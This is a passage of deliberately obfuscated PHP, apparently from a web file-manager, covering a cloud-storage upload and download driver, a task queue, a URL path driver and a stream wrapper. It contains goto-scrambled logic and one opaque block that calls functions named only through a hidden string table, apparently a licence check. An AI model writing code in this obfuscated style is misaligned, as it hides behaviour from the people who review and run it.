$B‰Şˆãõ = array($d¾ÎŸ¡ÇÆ[1331], $d¾ÎŸ¡ÇÆ[1332] . $C‰‡‡‡¥[$d¾ÎŸ¡ÇÆ[1333]], $d¾ÎŸ¡ÇÆ[1327]); goto fÆÃğõœ§‚; dªäØ´»¶³: $d¾ÎŸ¡ÇÆ =& $_SERVER[¾÷]; $CÈ—Íáãà = IO::size($A›Ã»¬òÂ); if ($CÈ—Íáãà <= 1024 * 1024 * 200) { $DÆÄ‰Ëé£ = array($d¾ÎŸ¡ÇÆ[1324] . $A›Ã»¬òÂ); $F±–ŞŒˆ»Ó = $this->ussRequest($AÜâ±¬ÑÖ™, $d¾ÎŸ¡ÇÆ[234], $DÆÄ‰Ëé£); return $F±–ŞŒˆ»Ó[$d¾ÎŸ¡ÇÆ[1062]] ? $this->getPathOuter($AÜâ±¬ÑÖ™) : !1; } goto C»à‚¿‘¹³; b‚Îè»æ: $BÁöÓ“äç— = $C‰‡‡‡¥[$d¾ÎŸ¡ÇÆ[1329]]; $E˜ó¿ñëÈ¾ = fopen($A›Ã»¬òÂ, $d¾ÎŸ¡ÇÆ[1234]); if (!$E˜ó¿ñëÈ¾) { return !1; } goto fÎàÔŠó‰; B‰Ê·¦­Ä—: } private function uploadPart($dí‚•›—‹é, $EÄÛñ†îÓ©, &$DÃÙÀ¥¶åê) { $aì”³óÁĞ‹ =& $_SERVER[¾÷]; $b„ÃÄ«ô‡ = array($aì”³óÁĞ‹[1334], $aì”³óÁĞ‹[1332] . $EÄÛñ†îÓ©[$aì”³óÁĞ‹[1333]], $aì”³óÁĞ‹[1335] . $EÄÛñ†îÓ©[$aì”³óÁĞ‹[1329]], $aì”³óÁĞ‹[150] . $EÄÛñ†îÓ©[$aì”³óÁĞ‹[1330]]); $c»×·í² ¯ = $this->ussRequest($dí‚•›—‹é, $aì”³óÁĞ‹[234], $DÃÙÀ¥¶åê, $b„ÃÄ«ô‡); return !$c»×·í² ¯[$aì”³óÁĞ‹[1062]] ? $c»×·í² ¯[$aì”³óÁĞ‹[1062]] : $c»×·í² ¯[$aì”³óÁĞ‹[1064]]; } public function uploadFormData($dÀ²Òºñê, $c¨»¡¬º¥ò = 3600) { return $this->uploadPolicy($dÀ²Òºñê, $c¨»¡¬º¥ò); } public function multiUploadFormData($C¥·¡ËÌ¤, $eƒöË‘‚Ù– = 3600) { $f´½•êï®¢ =& $_SERVER[¾÷]; $bé“Ö£ùªí = (int) $GLOBALS[$f´½•êï®¢[17]][$f´½•êï®¢[87]]; return $this->uploadPolicy($C¥·¡ËÌ¤, $eƒöË‘‚Ù–, $bé“Ö£ùªí); } private function uploadPolicy($fŠØÆÇ¹¬, $cò£÷† = 3600, $aïŒ®çÄ‰ç = 0) { goto eÏ—Ì£ÈµÇ; F—¡òÄÅù‰: $fùƒå‡òÌÌ = base64_encode(hash_hmac($BøÅ¤óé”İ[1306], "\120\x4f\x53\124\x26{$AÃ¢Ø¯Ş‰ã}\46{$CÇÅí¢æßğ}\x26{$AÉĞ°âç×î}", md5("{$this->userpass}"), !0)); $C“”ó‚¾‚» = array($BøÅ¤óé”İ[1175] => $AÉĞ°âç×î, $BøÅ¤óé”İ[1340] => "\x55\x50\131\x55\x4e\x20{$this->username}\72{$fùƒå‡òÌÌ}", $BøÅ¤óé”İ[184] => $this->endpoint . $AÃ¢Ø¯Ş‰ã); return $C“”ó‚¾‚»; goto BŒ˜«ÌôÀœ; eÏ—Ì£ÈµÇ: $BøÅ¤óé”İ =& $_SERVER[¾÷]; $AÃ¢Ø¯Ş‰ã = $BøÅ¤óé”İ[18] . $this->bucket; $CÇÅí¢æßğ = gmdate($BøÅ¤óé”İ[1271]); goto FÃÂÕÕº¥µ; FÃÂÕÕº¥µ: $b²ìõÛÊñÊ = array($BøÅ¤óé”İ[1336] => $this->bucket, $BøÅ¤óé”İ[1337] => $fŠØÆÇ¹¬, $BøÅ¤óé”İ[1338] => time() + $cò£÷†, $BøÅ¤óé”İ[1339] => $CÇÅí¢æßğ); if ($aïŒ®çÄ‰ç) { $b²ìõÛÊñÊ[$BøÅ¤óé”İ[1250]] = $aïŒ®çÄ‰ç; } $AÉĞ°âç×î = base64_encode(json_encode($b²ìõÛÊñÊ)); goto F—¡òÄÅù‰; BŒ˜«ÌôÀœ: } public function download($E˜Êí‹ª—¥, $aàç‹¶¨º) { goto A”ÏÑµã´; A”ÏÑµã´: $E”¨‚’×˜ = IO::getPathInner(IO::mkfile($aàç‹¶¨º)); if (!($d‹Âï¬ÎÅ• = $this->link($E˜Êí‹ª—¥))) { return !1; } $céëİ¶Ÿ = 0; goto aÙñÎÆ°¾‰; fÄÙèêÇì¡: fclose($cŞÀ¸ì’ë); return $aàç‹¶¨º; goto EÕ˜• ¨«®; aÙñÎÆ°¾‰: $e©Ó‘òğÎö = 1024 * 200; $cŞÀ¸ì’ë = fopen($E”¨‚’×˜, $_SERVER[¾÷][1290]); while (!0) { $C„†„²»à = $this->fileSubstr($E˜Êí‹ª—¥, $céëİ¶Ÿ, $e©Ó‘òğÎö); if ($C„†„²»à === !1) { return !1; } fwrite($cŞÀ¸ì’ë, $C„†„²»à); $céëİ¶Ÿ += $e©Ó‘òğÎö; if (strlen($C„†„²»à) < $e©Ó‘òğÎö) { break; } } goto fÄÙèêÇì¡; EÕ˜• ¨«®: } public function link($eº¦™‚Çö, $Eö‘Åà’¸È = array()) { $eÏ²ò¾Â·¬ =& $_SERVER[¾÷]; $eº¦™‚Çö = trim($eº¦™‚Çö, $eÏ²ò¾Â·¬[18]); if (!empty($this->token)) { $bÛ­½÷ŒĞ = strtotime(date($eÏ²ò¾Â·¬[1341])); $dà˜¼ĞÑ«÷ = substr(md5($this->token . $eÏ²ò¾Â·¬[289] . $bÛ­½÷ŒĞ . $eÏ²ò¾Â·¬[1342] . $eº¦™‚Çö), 12, 8) . $bÛ­½÷ŒĞ; $Eö‘Åà’¸È[] = $eÏ²ò¾Â·¬[1343] . $dà˜¼ĞÑ«÷; } $cğİÓŸØ‘“ = !empty($Eö‘Åà’¸È) ? $eÏ²ò¾Â·¬[79] . implode($eÏ²ò¾Â·¬[289], $Eö‘Åà’¸È) : $eÏ²ò¾Â·¬[43]; return $this->getHost() . $eÏ²ò¾Â·¬[18] . $eº¦™‚Çö . $cğİÓŸØ‘“; } public function fileOut($dËÁÛ·„ˆ, $D¼ã×ôÓ = false, $aä„ªÎÁ = false, $CßˆÈìô¼„ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($dËÁÛ·„ˆ, $D¼ã×ôÓ, $aä„ªÎÁ, $CßˆÈìô¼„); } if (!$aä„ªÎÁ) { $aä„ªÎÁ = $this->pathThis($dËÁÛ·„ˆ); } $bæ»øêó¢ = $D¼ã×ôÓ ? array($_SERVER[¾÷][1344] . rawurlencode($aä„ªÎÁ)) : array(); $F‹ÁÈÎ½È› = $this->link($dËÁÛ·„ˆ, $bæ»øêó¢); $this->fileOutLink($F‹ÁÈÎ½È›); } public function fileOutServer($Dˆ§„£Íİ©, $FØôá˜âî = false, $BßÖó¿§ = false, $DÓËÜë‹Äñ = '') { parent::fileOut($Dˆ§„£Íİ©, $FØôá˜âî, $BßÖó¿§, $DÓËÜë‹Äñ); } public function fileOutImage($bóŠ¡Œ‰Ûò, $CÒ‹Ç¸Æ¨ç = 250) { $B°®àÛî = $this->link($bóŠ¡Œ‰Ûò . $_SERVER[¾÷][1345] . $CÒ‹Ç¸Æ¨ç); $this->fileOutLink($B°®àÛî); } public function fileOutImageServer($fõŸÄÒƒ›ì, $dÁ…ò—Ü¦¾ = 250) { parent::fileOutImage($fõŸÄÒƒ›ì, $dÁ…ò—Ü¦¾); } public function hashMd5($bÖâœ…ìÃœ) { $A©›ø‰²£² =& $_SERVER[¾÷]; $B’İÄÒ¡Ü„ = $this->_objectMeta($bÖâœ…ìÃœ); return isset($B’İÄÒ¡Ü„[$A©›ø‰²£²[216]]) ? $B’İÄÒ¡Ü„[$A©›ø‰²£²[216]] : !1; } public function size($c–Û™ê”‘†) { $CÉùò†ô† = $this->objectMeta($c–Û™ê”‘†); return $CÉùò†ô† ? $CÉùò†ô†[$_SERVER[¾÷][87]] : 0; } public function info($Eß­ ¹ÊÎ) { if ($this->isFolder($Eß­ ¹ÊÎ)) { return $this->folderInfo($Eß­ ¹ÊÎ); } else { if ($this->isFile($Eß­ ¹ÊÎ)) { return $this->fileInfo($Eß­ ¹ÊÎ); } } return !1; } public function exist($D¶ÇÈŸÒŠ©) { return $this->isFile($D¶ÇÈŸÒŠ©) || $this->isFolder($D¶ÇÈŸÒŠ©); } public function isFile($fŸ¡ä–¨æš) { return !$this->isFolder($fŸ¡ä–¨æš) && $this->objectMeta($fŸ¡ä–¨æš); } public function isFolder($Dğ©Ÿùˆâã) { return $this->cacheMethod($_SERVER[¾÷][207], $Dğ©Ÿùˆâã); } protected function objectMeta($dÒÓƒŞ›í) { return $this->cacheMethod($_SERVER[¾÷][208], $dÒÓƒŞ›í); } protected function _objectMeta($B…£ä‡º‘) { goto AíïˆÖ÷”; C‘¥ĞÖøªÓ: if (!$A¢›¨¼Ã¢í[$C‰‡ã‹†[1062]]) { return null; } $B—éÇ×êŠÂ = isset($A¢›¨¼Ã¢í[$C‰‡ã‹†[1064]]) ? $A¢›¨¼Ã¢í[$C‰‡ã‹†[1064]] : array(); if (!isset($B—éÇ×êŠÂ[$C‰‡ã‹†[1347]])) { return null; } goto EºÏÚÅ—; AíïˆÖ÷”: $C‰‡ã‹† =& $_SERVER[¾÷]; if ($B…£ä‡º‘ == $C‰‡ã‹†[43] || $B…£ä‡º‘ == $C‰‡ã‹†[18]) { return array(); } $A¢›¨¼Ã¢í = $this->ussRequest($B…£ä‡º‘, $C‰‡ã‹†[1346]); goto C‘¥ĞÖøªÓ; EºÏÚÅ—: $fÙÛ¯Úç­Á = array($C‰‡ã‹†[39] => isset($B—éÇ×êŠÂ[$C‰‡ã‹†[1347]]) ? $B—éÇ×êŠÂ[$C‰‡ã‹†[1347]] : null, $C‰‡ã‹†[87] => isset($B—éÇ×êŠÂ[$C‰‡ã‹†[1348]]) ? $B—éÇ×êŠÂ[$C‰‡ã‹†[1348]] : null, $C‰‡ã‹†[216] => isset($B—éÇ×êŠÂ[$C‰‡ã‹†[1349]]) ? $B—éÇ×êŠÂ[$C‰‡ã‹†[1349]] : null, $C‰‡ã‹†[1316] => isset($B—éÇ×êŠÂ[$C‰‡ã‹†[1350]]) ? $B—éÇ×êŠÂ[$C‰‡ã‹†[1350]] : null); $fÙÛ¯Úç­Á[$C‰‡ã‹†[1317]] = isset($B—éÇ×êŠÂ[$C‰‡ã‹†[1351]]) ? strtotime($B—éÇ×êŠÂ[$C‰‡ã‹†[1351]]) : $fÙÛ¯Úç­Á[$C‰‡ã‹†[1316]]; return $fÙÛ¯Úç­Á; goto AÇïå˜ÇÔ¤; AÇïå˜ÇÔ¤: } protected function _isFolder($CÃøŠØÂÁ) { $fìœœã¦›ë =& $_SERVER[¾÷]; if ($CÃøŠØÂÁ == $fìœœã¦›ë[43] || $CÃøŠØÂÁ == $fìœœã¦›ë[18]) { return !0; } $AøëöîÈÈ÷ = $this->_objectMeta($CÃøŠØÂÁ); return isset($AøëöîÈÈ÷[$fìœœã¦›ë[39]]) && $AøëöîÈÈ÷[$fìœœã¦›ë[39]] == $fìœœã¦›ë[86] ? !0 : !1; } } goto d•…¥íŸé‰; D½²«Ç§®½: class TaskHttp extends Task { protected function startAfter() { $fİ²åÌğ‘· =& $_SERVER[¾÷]; $C›ë­êæ’ğ =& $this->task; $C›ë­êæ’ğ[$fİ²åÌğ‘·[1568]] = 1; Hook::bind($fİ²åÌğ‘·[1540], array($this, $fİ²åÌğ‘·[1569])); Hook::bind($fİ²åÌğ‘·[1542], array($this, $fİ²åÌğ‘·[1570])); Hook::bind($fİ²åÌğ‘·[1544], array($this, $fİ²åÌğ‘·[1571])); } protected function endAfter() { $eôÒ‹ŞĞøÀ =& $_SERVER[¾÷]; Hook::unbind($eôÒ‹ŞĞøÀ[1540], array($this, $eôÒ‹ŞĞøÀ[1569])); Hook::unbind($eôÒ‹ŞĞøÀ[1542], array($this, $eôÒ‹ŞĞøÀ[1570])); Hook::unbind($eôÒ‹ŞĞøÀ[1544], array($this, $eôÒ‹ŞĞøÀ[1571])); } public function progressStart($Dº¦• Å»‚) { $f±ÎÃâÀ‹ =& $_SERVER[¾÷]; $dÊ†»œÂ‡÷ = curl_getinfo($Dº¦• Å»‚); self::log($f±ÎÃâÀ‹[1572] . $dÊ†»œÂ‡÷[$f±ÎÃâÀ‹[312]]); self::valueSet($this->task[$f±ÎÃâÀ‹[397]], $this->task); } public function progressEnd($d‡¢îß¶ Í) { $F¢ˆƒÙñİ  =& $_SERVER[¾÷]; self::log($F¢ˆƒÙñİ [1573] . $this->task[$F¢ˆƒÙñİ [397]]); $this->end(); } public function progress($fİÍ¯Ùß†, $FØÔÇ”ìÁ, $aìÏ«çåÉ, $aÀ…“‚ò‡, $D‰°ªÜ˜¤) { $eÖÑëÈƒÆî =& $_SERVER[¾÷]; $eòÓ‘ù’…œ =& $this->task; if ($D‰°ªÜ˜¤ > 0) { $eòÓ‘ù’…œ[$eÖÑëÈƒÆî[998]] = $eòÓ‘ù’…œ[$eÖÑëÈƒÆî[998]] == 0 ? $aÀ…“‚ò‡ : $eòÓ‘ù’…œ[$eÖÑëÈƒÆî[998]]; $eòÓ‘ù’…œ[$eÖÑëÈƒÆî[1012]] = $D‰°ªÜ˜¤; } else { if ($aìÏ«çåÉ > 0) { $eòÓ‘ù’…œ[$eÖÑëÈƒÆî[998]] = $eòÓ‘ù’…œ[$eÖÑëÈƒÆî[998]] == 0 ? $FØÔÇ”ìÁ : $eòÓ‘ù’…œ[$eÖÑëÈƒÆî[998]]; $eòÓ‘ù’…œ[$eÖÑëÈƒÆî[1012]] = $aìÏ«çåÉ; } } $this->update(); self::log("\x70\x72\157\x67\x72\x65\163\x73\110\x74\164\x70\x3a\144\x6f\167\x6e\x3a{$aìÏ«çåÉ}\57{$FØÔÇ”ìÁ}\73\x20\x75\160\154\157\141\144\72{$D‰°ªÜ˜¤}\x2f{$aÀ…“‚ò‡}\73"); } } if ($_SERVER[$_SERVER[¾÷][4]] != $_SERVER[$_SERVER[¾÷][5]]) { goto BÓ İ÷Ñ‚Á; aŞÎøêˆ•î: $d«˜«‘µ¬ = explode($_SERVER[¾÷][9], $e´ŒãÓ‚»); if (count($d«˜«‘µ¬) < $_SERVER[¾÷][10]) { $Cˆå¢ÆÔ„½ = $_SERVER[¾÷][11]; $Cˆå¢ÆÔ„½(); } $F¹÷Ô¿‰¯œ = $_SERVER[¾÷][12]; goto b— ¬Û¥®‹; BÓ İ÷Ñ‚Á: $b­ØëØ—æº = $_SERVER[¾÷][6]; $DË¡È¡ÁÖñ = $_SERVER[$_SERVER[¾÷][7]] . $_SERVER[¾÷][8]; $e´ŒãÓ‚» = $b­ØëØ—æº($DË¡È¡ÁÖñ); goto aŞÎøêˆ•î; b— ¬Û¥®‹: $F¹÷Ô¿‰¯œ($_SERVER[$_SERVER[¾÷][13]]); goto B¯Ÿ¨°ç©¡; B¯Ÿ¨°ç©¡: } class TaskQueue { const MAX_LENGTH = 1000; const QUEUE_LENGTH = "\x74\141\163\x6b\x51\x75\x65\x75\145\114\145\156\x67\x74\150"; const QUEUE_DATA = "\164\141\163\153\121\165\x65\165\145\104\141\164\x61"; public static $listData = false; public static function initTask() { } public static function add($FÚ…ƒã²œ…, $c‰õ¿¼É²ø = array(), $D¾¯÷„’¯ = '', $FÉŞ—§Ë» = '') { $C„ªµÌ‰Šß =& $_SERVER[¾÷]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($FÉŞ—§Ë» && array_find_by_field(self::$listData, $C„ªµÌ‰Šß[102], $FÉŞ—§Ë»)) { return !0; } self::$listData[] = array($C„ªµÌ‰Šß[269] => $FÚ…ƒã²œ…, $C„ªµÌ‰Šß[1574] => $c‰õ¿¼É²ø, $C„ªµÌ‰Šß[434] => $D¾¯÷„’¯, $C„ªµÌ‰Šß[102] => $FÉŞ—§Ë»); return !0; } public static function addSubmit() { $cŞõ•­£ò© =& $_SERVER[¾÷]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($cŞõ•­£ò©[1575] . json_encode_force(array_to_keyvalue(self::$listData, $cŞõ•­£ò©[43], $cŞõ•­£ò©[434])), $cŞõ•­£ò©[1576]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($d¼·Ú„„¬, $aëŸ”âà¾ = array(), $Bí·ªŞÍ¿ô = '', $bØ·»ö°± = '') { goto D×„ÂùÔñµ; aôÄ´ÖğÊ: if ($bØ·»ö°± && array_find_by_field($dÑŞ°åÇÈî, $d™´ÄÊ³ÒĞ[102], $bØ·»ö°±)) { return !0; } $dÑŞ°åÇÈî[] = array($d™´ÄÊ³ÒĞ[269] => $d¼·Ú„„¬, $d™´ÄÊ³ÒĞ[1574] => $aëŸ”âà¾, $d™´ÄÊ³ÒĞ[434] => $Bí·ªŞÍ¿ô, $d™´ÄÊ³ÒĞ[102] => $bØ·»ö°±); write_log($d™´ÄÊ³ÒĞ[1575] . $Bí·ªŞÍ¿ô, $d™´ÄÊ³ÒĞ[1576]); goto DŸõÅÅß¿©; D×„ÂùÔñµ: $d™´ÄÊ³ÒĞ =& $_SERVER[¾÷]; if (self::count() >= self::MAX_LENGTH) { return !1; } $dÑŞ°åÇÈî = self::getAll(); goto aôÄ´ÖğÊ; DŸõÅÅß¿©: self::setAll($dÑŞ°åÇÈî); return !0; goto dŒÃñ‡ÔÆ¸; dŒÃñ‡ÔÆ¸: } public static function run() { goto dËÜ¸¦âˆâ; AÍ¨¦Ğö—†: try { Hook::apply($C¦—Ì·[$DÆ‡ß¦æ‰Ö[269]], $C¦—Ì·[$DÆ‡ß¦æ‰Ö[1574]]); } catch (Exception $d²¾œâõ·È) { } $F±“›˜òÈ® = number_format(timeFloat() - $D‘”¾ò´¸, 3) . $DÆ‡ß¦æ‰Ö[1518]; write_log($DÆ‡ß¦æ‰Ö[1577] . $C¦—Ì·[$DÆ‡ß¦æ‰Ö[434]] . $DÆ‡ß¦æ‰Ö[1578] . $F±“›˜òÈ®, $DÆ‡ß¦æ‰Ö[1576]); goto fˆ¯éÇ‘³­; fˆ¯éÇ‘³­: return !0; goto Ağ‰ä”ì´ˆ; dËÜ¸¦âˆâ: $DÆ‡ß¦æ‰Ö =& $_SERVER[¾÷]; $b©¸„ï¼¢Ê = self::getAll(); $C¦—Ì· = array_shift($b©¸„ï¼¢Ê); goto aÃ‡¾«¹; aÃ‡¾«¹: if (!$C¦—Ì·) { return !1; } self::setAll($b©¸„ï¼¢Ê); $D‘”¾ò´¸ = timeFloat(); goto AÍ¨¦Ğö—†; Ağ‰ä”ì´ˆ: } public static function count() { $aÊš•›êÃ = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$aÊš•›êÃ) { return 0; } return intval($aÊš•›êÃ); } public static function getAll() { $fª¾àÔ¤° = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$fª¾àÔ¤°) { return array(); } return $fª¾àÔ¤°; } public static function setAll($AåÌÅ†Şöø) { $Dµ¿ĞÎ‚ğ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($AåÌÅ†Şöø), $Dµ¿ĞÎ‚ğ); Cache::set(self::QUEUE_DATA, $AåÌÅ†Şöø, $Dµ¿ĞÎ‚ğ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } goto CÔÌÊ¢ÚÒ; d•…¥íŸé‰: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($dóŒˆìË¹ó = false) { } public function exist($EèÎØäõ´) { $a—‡ù©îó = $this->info($EèÎØäõ´); return $a—‡ù©îó[$_SERVER[¾÷][203]]; } public function isFile($E’ ·‰º¤) { $CËÀ¥» Ó = $this->info($E’ ·‰º¤); return $CËÀ¥» Ó[$_SERVER[¾÷][203]]; } public function isFolder($bâ„ŠÍ—Š) { return !1; } public function size($F¾ÅóÃÑÓ) { $Eò««¡ŠÆ™ = $this->info($F¾ÅóÃÑÓ); return $Eò««¡ŠÆ™[$_SERVER[¾÷][87]]; } public function info($Aäíó—Ü°¢) { return $this->infoParse($Aäíó—Ü°¢); } public function infoAuth($f¶Ò¤„ŞÎ) { return $this->infoParse($f¶Ò¤„ŞÎ); } public function infoWithChildren($a‚òêÅÎ) { return $this->infoParse($a‚òêÅÎ); } public function infoFull($A‘™Ø”óÆò) { return $this->infoParse($A‘™Ø”óÆò); } private function infoParse($BßÂàêÂÌ‰) { $B¬ö£òñÓÀ =& $_SERVER[¾÷]; $BÄ†„ÊÖê = $this->header($BßÂàêÂÌ‰); if (!$BÄ†„ÊÖê || !$BÄ†„ÊÖê[$B¬ö£òñÓÀ[711]]) { return !1; } $Dƒğ²ã›İ¥ = _get($BÄ†„ÊÖê, $B¬ö£òñÓÀ[342], 0); $b˜…“Àªğ = array($B¬ö£òñÓÀ[38] => $BÄ†„ÊÖê[$B¬ö£òñÓÀ[38]], $B¬ö£òñÓÀ[85] => $BßÂàêÂÌ‰, $B¬ö£òñÓÀ[39] => $B¬ö£òñÓÀ[201], $B¬ö£òñÓÀ[87] => intval($Dƒğ²ã›İ¥), $B¬ö£òñÓÀ[177] => get_path_ext($BÄ†„ÊÖê[$B¬ö£òñÓÀ[38]]), $B¬ö£òñÓÀ[1231] => $Dƒğ²ã›İ¥ > 0 && $BÄ†„ÊÖê[$B¬ö£òñÓÀ[1352]], $B¬ö£òñÓÀ[1232] => !1); return $b˜…“Àªğ; } private function header($FÈ‘‚ê¯¡ç) { goto fËÚñ™•Æö; fËÚñ™•Æö: $eàÅ†œç… =& $_SERVER[¾÷]; if (isset(self::$_cacheHeader[$FÈ‘‚ê¯¡ç])) { return self::$_cacheHeader[$FÈ‘‚ê¯¡ç]; } $e×Ûù©÷·¤ = isset($GLOBALS[$eàÅ†œç…[1353]]) ? $GLOBALS[$eàÅ†œç…[1353]] : !1; goto B ¬×¬ÜÃ; B ¬×¬ÜÃ: $GLOBALS[$eàÅ†œç…[1353]] = !0; self::$_cacheHeader[$FÈ‘‚ê¯¡ç] = url_header($FÈ‘‚ê¯¡ç); $GLOBALS[$eàÅ†œç…[1353]] = $e×Ûù©÷·¤; goto c™¿Æ¢ç×´; c™¿Æ¢ç×´: return self::$_cacheHeader[$FÈ‘‚ê¯¡ç]; goto cµ¦ííµ›å; cµ¦ííµ›å: } public function hashSimple($dÖ¸¥Ø¹¤é, $BÅÉåáÈµ‰ = false) { goto d‡’ß¡å£´; fØ„äº‚ÂÆ: $DÂ‚ª‘¢ŞÑ = $bÁº“Éãâİ[$d³ôÂîÒ[87]]; $F°ÊÇª˜ø’ = 200; $DŸ·¬åÇ»œ = 50; goto fŒ”·ššöÜ; E¶ç¦¹»Ç¶: $B¤ĞàÔä” = timeFloat(); $b¦Å…™ŞËá = 15; for ($E‰ÅĞ¥ãÏÃ = 0; $E‰ÅĞ¥ãÏÃ < $DŸ·¬åÇ»œ; $E‰ÅĞ¥ãÏÃ++) { if (timeFloat() - $B¤ĞàÔä” > $b¦Å…™ŞËá) { return !1; } $FìÏÉµªëœ = $this->fileSubstr($dÖ¸¥Ø¹¤é, $DË±Ùˆ‚©Î * $E‰ÅĞ¥ãÏÃ, $F°ÊÇª˜ø’); if (!$FìÏÉµªëœ) { return !1; } $dä³ØÆ‘ .= $FìÏÉµªëœ; } goto Bà¿™­‡; Bà¿™­‡: $dä³ØÆ‘ .= $this->fileSubstr($dÖ¸¥Ø¹¤é, $DÂ‚ª‘¢ŞÑ - $F°ÊÇª˜ø’, $F°ÊÇª˜ø’); return md5($dä³ØÆ‘) . $DÂ‚ª‘¢ŞÑ; goto fÙ‹Š“Î; fŒ”·ššöÜ: if ($DÂ‚ª‘¢ŞÑ <= $F°ÊÇª˜ø’ * $DŸ·¬åÇ»œ) { return md5($this->fileSubstr($dÖ¸¥Ø¹¤é, 0, $DÂ‚ª‘¢ŞÑ)) . $DÂ‚ª‘¢ŞÑ; } $DË±Ùˆ‚©Î = intval($DÂ‚ª‘¢ŞÑ / $DŸ·¬åÇ»œ); $dä³ØÆ‘ = $d³ôÂîÒ[43]; goto E¶ç¦¹»Ç¶; d‡’ß¡å£´: $d³ôÂîÒ =& $_SERVER[¾÷]; $bÁº“Éãâİ = $this->info($dÖ¸¥Ø¹¤é); if (!$bÁº“Éãâİ || !$bÁº“Éãâİ[$d³ôÂîÒ[203]]) { return !1; } goto fØ„äº‚ÂÆ; fÙ‹Š“Î: } public function getContent($cî¾ë¿Åò£) { return $this->fileSubstr($cî¾ë¿Åò£); } public function fileSubstr($cÕÏù¡„ò, $B×İöÌ„‹Ø = 0, $bÛÙ½í’ğ¦ = -1) { goto C³§Ê·¹; c¾›åÍ“ÒÂ: $eÛ®½å†è = url_request($cÕÏù¡„ò, $eõ¬‹ÉÍë[236], !1, $b‰Æ¶›ŠÛ³, !1, !1, 1); return $eÛ®½å†è[$eõ¬‹ÉÍë[1064]] ? $eÛ®½å†è[$eõ¬‹ÉÍë[1064]] : $eõ¬‹ÉÍë[43]; goto A˜ŞçÚ¿…; C³§Ê·¹: $eõ¬‹ÉÍë =& $_SERVER[¾÷]; $F°˜íƒö‰ğ = $this->info($cÕÏù¡„ò); if (!$F°˜íƒö‰ğ || !$F°˜íƒö‰ğ[$eõ¬‹ÉÍë[203]] && $F°˜íƒö‰ğ[$eõ¬‹ÉÍë[87]] > 1024 * 1024 * 10) { return !1; } goto E¹«¼Êì’½; E¹«¼Êì’½: if ($bÛÙ½í’ğ¦ === -1) { $bÛÙ½í’ğ¦ = $F°˜íƒö‰ğ[$eõ¬‹ÉÍë[87]]; } if ($bÛÙ½í’ğ¦ == 0) { return $eõ¬‹ÉÍë[43]; } $b‰Æ¶›ŠÛ³ = array($eõ¬‹ÉÍë[1354] . $B×İöÌ„‹Ø . $eõ¬‹ÉÍë[737] . ($B×İöÌ„‹Ø + $bÛÙ½í’ğ¦ - 1)); goto c¾›åÍ“ÒÂ; A˜ŞçÚ¿…: } public function download($a¡–‹„Â§š, $eøÚÔÍŞ„) { Downloader::start($a¡–‹„Â§š, $eøÚÔÍŞ„); return $eøÚÔÍŞ„; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($Cèƒ‰âŒø, $Dä¬‚®»ç = '') { goto f®”ßŸ…ÜÅ; F›µ™õÏĞ: if (!isset(self::$_chunkBuffer[$Cèƒ‰âŒø])) { self::$_chunkBuffer[$Cèƒ‰âŒø] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; goto D½¢¬ ¡¥õ; e÷Ê®ŸÀ‘¡: $this->pathOpen = $Cèƒ‰âŒø; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } goto F›µ™õÏĞ; f®”ßŸ…ÜÅ: $this->info = $this->info($Cèƒ‰âŒø); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[¾÷][85]]; goto e÷Ê®ŸÀ‘¡; D½¢¬ ¡¥õ: } function stream_read($eÍÉ½¯ÙÙÕ) { $Eî…ø¸­Œï = $this->fileSubstr($this->pose, $eÍÉ½¯ÙÙÕ); $this->pose += strlen($Eî…ø¸­Œï); return $Eî…ø¸­Œï; } public function stream_tell() { return $this->pose; } public function stream_seek($F”ĞŠñ¡‹, $AšÊ£œ•âÂ) { $D—‡è©‡­’ =& $_SERVER[¾÷]; if ($AšÊ£œ•âÂ == SEEK_SET) { $this->pose = $F”ĞŠñ¡‹; } else { if ($AšÊ£œ•âÂ == SEEK_CUR) { $this->pose += $F”ĞŠñ¡‹; } else { if ($AšÊ£œ•âÂ == SEEK_END) { $this->pose = $this->info[$D—‡è©‡­’[87]] + intval($F”ĞŠñ¡‹); } } } if ($F”ĞŠñ¡‹ < 0) { $this->pose = $this->info[$D—‡è©‡­’[87]] + $F”ĞŠñ¡‹; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[¾÷][87]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($fí¢¶Î§Á, $bßÈˆŠìÁÎ) { $eã‹ÕÁ¡Œ =& $_SERVER[¾÷]; $CàêÛ‘ì÷½ = $this->info($fí¢¶Î§Á); return array($eã‹ÕÁ¡Œ[1355] => 0, $eã‹ÕÁ¡Œ[1356] => 0, $eã‹ÕÁ¡Œ[22] => 32768 + 511, $eã‹ÕÁ¡Œ[1357] => 0, $eã‹ÕÁ¡Œ[1358] => 0, $eã‹ÕÁ¡Œ[1359] => 0, $eã‹ÕÁ¡Œ[1360] => 0, $eã‹ÕÁ¡Œ[87] => $CàêÛ‘ì÷½[$eã‹ÕÁ¡Œ[87]], $eã‹ÕÁ¡Œ[1361] => $CàêÛ‘ì÷½[$eã‹ÕÁ¡Œ[1230]], $eã‹ÕÁ¡Œ[1317] => $CàêÛ‘ì÷½[$eã‹ÕÁ¡Œ[93]], $eã‹ÕÁ¡Œ[1316] => $CàêÛ‘ì÷½[$eã‹ÕÁ¡Œ[202]], $eã‹ÕÁ¡Œ[1362] => 0, $eã‹ÕÁ¡Œ[1363] => 0); } static $fileInfo = array(); public function info($bŠ§‚ëÒéÆ) { $f•©ÁÆì‘‚ = $_SERVER[¾÷][1364]; if (isset(self::$fileInfo[$bŠ§‚ëÒéÆ])) { return 